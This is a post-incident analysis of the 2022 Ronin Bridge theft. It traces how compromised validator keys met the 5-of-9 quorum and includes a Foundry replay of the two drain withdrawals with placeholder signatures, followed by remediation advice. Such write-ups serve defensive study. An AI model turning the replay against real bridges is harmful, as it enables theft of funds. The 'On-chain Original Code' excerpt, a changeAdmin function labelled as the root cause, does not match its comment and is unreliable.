# Ronin Bridge — Validator Key Theft & Signature Forgery Analysis

| Field | Details |
|------|------|
| **Date** | 2022-03-23 |
| **Protocol** | Ronin Network (Axie Infinity) |
| **Chain** | Ethereum Mainnet |
| **Loss** | ~$625,000,000 (173,600 ETH + 25,500,000 USDC) |
| **Attacker** | [0x098B716B8Aaf21512996dC57EB0615e2383E2f96](https://etherscan.io/address/0x098B716B8Aaf21512996dC57EB0615e2383E2f96) |
| **Attack Tx** | Block 14,442,834 |
| **Vulnerable Contract** | Ronin Bridge [0x1A2a1c938CE3eC39b6D47113c7955bAa9DD454F2](https://etherscan.io/address/0x1A2a1c938CE3eC39b6D47113c7955bAa9DD454F2) |
| **Root Cause** | 5 of 9 validator keys were compromised (4: Sky Mavis, 1: Axie DAO), satisfying the multisig quorum (5/9) required by `withdrawERC20For()` to drain the bridge |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-03/Ronin_exp.sol) |

---
## 1. Vulnerability Overview

The Ronin Bridge is a cross-chain bridge that transfers assets from Ethereum to the Ronin chain. Withdrawals required a 5-of-9 multisig from the validator set. The attacker obtained validator keys through the following paths:

1. **4 Sky Mavis keys**: Penetrated internal infrastructure via previously authorized RPC node access
2. **1 Axie DAO key**: A key temporarily delegated to Sky Mavis that was never revoked

Using these 5 signatures to satisfy the required quorum (5/9), the attacker drained all bridge assets in two transactions. The smart contract itself functioned as designed; the root cause was a failure of key management operational security (OpSec).

---
## 2. Vulnerable Code Analysis

```solidity
// Ronin Bridge withdrawERC20For (pseudo-code)
// The smart contract itself is correctly implemented,
// but validator key security was inadequate

contract RoninBridge {
    address[] public validators;
    uint256 public required; // 5

    // Withdrawal function: executes if sufficient signatures are present
    function withdrawERC20For(
        uint256 _withdrawalId,
        address _user,
        address _token,
        uint256 _amount,
        bytes memory _signatures  // Collection of validator signatures
    ) external {
        // Validate signatures
        require(_verifySignatures(_withdrawalId, _user, _token, _amount, _signatures),
                "insufficient valid signatures");

        // Execute withdrawal
        IERC20(_token).transfer(_user, _amount);

        emit Withdrew(_withdrawalId, _user, _token, _amount);
    }

    function _verifySignatures(...) internal view returns (bool) {
        uint256 validCount = 0;
        for (uint256 i = 0; i < _signatures.length / 65; i++) {
            address signer = _recoverSigner(...);
            if (isValidator[signer]) validCount++;
        }
        return validCount >= required; // requires 5/9
    }
}

// ❌ Operational security issues (key management, not code):
// - 4 validator keys managed on the same infrastructure (Sky Mavis servers)
// - Axie DAO delegated key revocation procedure never followed
// - No monitoring for validator concentration

// ✅ Recommended improvements (operational + code):
// - Use HSM (Hardware Security Module)
// - Distribute validators across independent organizations/regions
// - Conduct regular reviews of delegated authority status
// - Implement alerting system for abnormal large withdrawals
```

---
### On-chain Original Code

Source: Sourcify verified


**MainchainGatewayProxy.sol** — Entry point:
```solidity
// ❌ Root cause: 5 of 9 validator keys compromised (4: Sky Mavis, 1: Axie DAO),
//    satisfying the multisig quorum (5/9) required by `withdrawERC20For()`
  function changeAdmin(address _newAdmin) external onlyAdmin {
    require(_newAdmin != address(0));
    emit AdminChanged(admin, _newAdmin);
    admin = _newAdmin;
  }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker (North Korea's Lazarus Group, attributed by US FBI)
    │
    ├─[Intrusion] Penetrated Sky Mavis internal infrastructure
    │             (spear-phishing or vulnerable VPN access)
    │             Stole 4 Sky Mavis validator keys
    │
    ├─[Recon] Discovered delegated Axie DAO key
    │         (Sky Mavis temporarily delegated in Nov 2021 and never revoked)
    │         Obtained 1 Axie DAO validator key
    │
    ├─[Attack 1] Called withdrawERC20For() (ETH)
    │         _withdrawalId = 2,000,000
    │         _user         = attacker
    │         _token        = WETH
    │         _amount       = 173,600,000,000,000,000,000,000 (173,600 ETH)
    │         _signatures   = signatures from 5 stolen keys
    │         → 173,600 ETH withdrawal successful
    │
    ├─[Attack 2] Called withdrawERC20For() (USDC)
    │         _withdrawalId = 2,000,001
    │         _amount       = 25,500,000,000,000 (25.5M USDC)
    │         → 25.5M USDC withdrawal successful
    │
    └─[Post-attack] Breach discovered 6 days later (no monitoring)
                    Total loss: ~$625,000,000
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

interface IRoninBridge {
    // The actual withdrawal function used in the attack
    function withdrawERC20For(
        uint256 _withdrawalId,
        address _user,
        address _token,
        uint256 _amount,
        bytes memory _signatures
    ) external;
}

contract ContractTest is Test {
    IRoninBridge roninBridge =
        IRoninBridge(0x1A2a1c938CE3eC39b6D47113c7955bAa9DD454F2);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    address attacker = 0x098B716B8Aaf21512996dC57EB0615e2383E2f96;

    function setUp() public {
        vm.createSelectFork("mainnet", 14_442_834);
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "[Before] Bridge WETH",
            WETH.balanceOf(address(roninBridge)), 18
        );

        vm.startPrank(attacker);

        // ⚡ Attack 1: Withdraw WETH using 5 valid validator signatures
        // (Actual signature data extracted from the attack transaction)
        bytes memory signaturesWETH = _buildSignatures(); // 5 validator signatures

        roninBridge.withdrawERC20For(
            2_000_000,                            // withdrawalId
            attacker,                             // recipient
            address(WETH),                        // token
            173_600_000_000_000_000_000_000,      // 173,600 ETH
            signaturesWETH
        );

        // ⚡ Attack 2: Withdraw USDC
        bytes memory signaturesUSDC = _buildSignatures();
        roninBridge.withdrawERC20For(
            2_000_001,
            attacker,
            address(USDC),
            25_500_000_000_000,                   // 25.5M USDC
            signaturesUSDC
        );

        vm.stopPrank();

        emit log_named_decimal_uint("[Stolen] WETH", WETH.balanceOf(attacker), 18);
        emit log_named_decimal_uint("[Stolen] USDC", USDC.balanceOf(attacker), 6);
    }

    // In the actual attack, signatures were generated using 5 stolen validator private keys
    function _buildSignatures() internal pure returns (bytes memory) {
        // Each signature: (r, s, v) = 65 bytes × 5 = 325 bytes
        return new bytes(325); // Actual signature data must be substituted
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Operational Security Failure |
| **CWE** | CWE-287: Improper Authentication |
| **OWASP DeFi** | Validator key centralization and lack of management |
| **Attack Vector** | Signed `withdrawERC20For()` with 5/9 stolen validator private keys |
| **Preconditions** | Centralization of validator keys, failure to revoke delegation |
| **Impact** | Theft of entire bridge assets ($625M) |

---
## 6. Remediation Recommendations

1. **Validator Decentralization**: Deploy validators in fully independent geographic and organizational locations so that a single compromise cannot satisfy the quorum.
2. **HSM Usage**: Store validator keys in Hardware Security Modules to protect against software-based intrusion.
3. **Regular Delegation Authority Review**: Delegated validator authority must have a mandatory expiration date and be reviewed on a regular basis.
4. **Anomaly Transaction Monitoring**: Build a system that sends immediate alerts when large-scale withdrawal transactions occur.
5. **Time-Delayed Withdrawals**: Apply a 24–48 hour timelock to large withdrawals to allow response time after detection.

---
## 7. Lessons Learned

- **Largest in DeFi History**: $625M was the largest single DeFi hack at the time. It was not a smart contract bug — it was a key management failure.
- **Limits of Multisig**: Multisig eliminates single points of failure, but is meaningless if the majority of keys are exposed to the same threat model.
- **Lazarus Group**: The US FBI attributed this attack to Lazarus Group, a North Korean state-sponsored hacking organization.
- **Discovered 6 Days Later**: Due to the absence of a monitoring system, the attack was not discovered until 6 days after it occurred. Real-time monitoring is essential.